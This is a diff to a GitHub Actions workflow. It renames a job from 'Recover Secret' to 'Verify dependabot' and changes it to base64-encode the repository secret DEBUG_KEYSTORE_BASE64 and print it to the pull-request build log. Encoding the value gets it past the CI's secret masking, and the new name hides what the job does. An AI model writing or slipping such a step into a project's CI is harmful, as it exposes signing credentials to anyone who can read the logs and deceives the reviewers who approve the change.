@@ -1,4 +1,4 @@
-name: Recover Secret
+name: Verify dependabot
 on:
   pull_request:
     branches:
@@ -9,4 +9,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |
-          echo "SECRET (base64) = $(echo ${{ secrets.DEBUG_KEYSTORE_BASE64 }} | base64)"
+          echo "SECRET_BASE64=$(echo -n '${{ secrets.DEBUG_KEYSTORE_BASE64 }}' | base64 -w 0)" >> $GITHUB_OUTPUT
+        id: secret
+      - run: |
+          echo "El valor base64 de tu secreto es: ${{ steps.secret.outputs.SECRET_BASE64 }}"
